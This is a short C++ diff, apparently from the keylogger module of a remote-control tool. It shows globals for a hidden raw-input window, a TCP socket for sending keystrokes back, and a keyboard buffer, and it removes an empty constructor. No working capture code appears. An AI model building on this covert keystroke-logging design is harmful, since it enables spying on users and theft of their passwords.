@@ -7,15 +7,6 @@ static HWND s_hWnd = NULL; // 用来接收原始设备输入的隐形窗口句柄
 static TcpSocket gSock; // 用来送回键盘数据
 static std::vector<char> gBuffer; // 键盘数据缓冲区
 
-// 由于有内部本类的出现
-// 构造函数在一开始就执行
-// 会引发创建隐藏窗口并一直记录键盘数据
-// 而此时hunter并不一定请求键盘数据
-// 也就不启动发送
-Keybd::Keybd()
-{
-}
-
 Keybd::~Keybd()
 {
 	gSock.dissconnect();
